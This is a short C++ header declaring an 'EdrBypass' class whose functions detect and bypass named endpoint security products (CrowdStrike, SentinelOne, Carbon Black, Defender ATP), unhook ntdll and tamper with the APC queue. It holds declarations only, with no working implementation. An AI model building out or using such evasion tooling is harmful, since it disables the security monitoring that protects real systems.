#ifndef EDR_BYPASS_H
#define EDR_BYPASS_H

#include <Windows.h>
#include <vector>
#include <string>

class EdrBypass {
public:
    static std::vector<std::string> DetectEdr();
    static bool BypassCrowdStrike();
    static bool BypassSentinelOne();
    static bool BypassCarbonBlack();
    static bool BypassDefenderATP();
    static bool BypassAllDetected();
    static bool UnhookNtdll();
    static bool ModifyApcQueue();
    
private:
    static bool CheckProcessExists(const char* processName);
    static bool CheckServiceExists(const char* serviceName);
    static bool CheckDriverExists(const char* driverName);
};

#endif
